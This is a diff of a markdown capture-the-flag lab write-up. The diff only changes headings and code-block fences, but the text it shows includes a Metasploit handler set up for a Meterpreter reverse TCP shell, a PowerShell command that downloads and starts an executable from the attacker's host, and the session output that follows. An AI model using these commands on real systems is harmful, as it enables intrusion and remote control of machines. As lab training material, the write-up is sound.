@@ -111,9 +111,9 @@ Saved as: purple_drink.exe
 - Run msf handler as well
 
 
-```
-### LINUX
 
+#### LINUX
+```
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcppayload => windows/meterpreter/reverse_tcp
 msf6 exploit(multi/handler) > set lhost tun0
@@ -121,15 +121,15 @@ lhost => 10.6.82.216
 msf6 exploit(multi/handler) > set lport 8888
 lport => 8888
 msf6 exploit(multi/handler) > run
-
-### Windows NC Shell
-
+```
+#### Windows NC Shell
+```
 PS C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.82.216:8000/purple_drink.exe', 'purple_drink.exe')"
 PS C:\Users\bruce\Desktop> Start-Process 'purple_drink.exe'
 PS C:\Users\bruce\Desktop> 
-
+```
 ### LINUX
-
+```
 [*] Started reverse TCP handler on 10.6.82.216:8888 
 [*] Sending stage (175174 bytes) to 10.10.242.101[*] Meterpreter session 1 opened (10.6.82.216:8888 -> 10.10.242.101:49264) at 2021-11-05 16:39:07 -0400
 
@@ -140,7 +140,7 @@ meterpreter >
 #### Step 3: Privilege Escalation
 
 ```
-### Windows
+#### Windows
 
 PS C:\Users\bruce\Desktop> whoami /priv
 
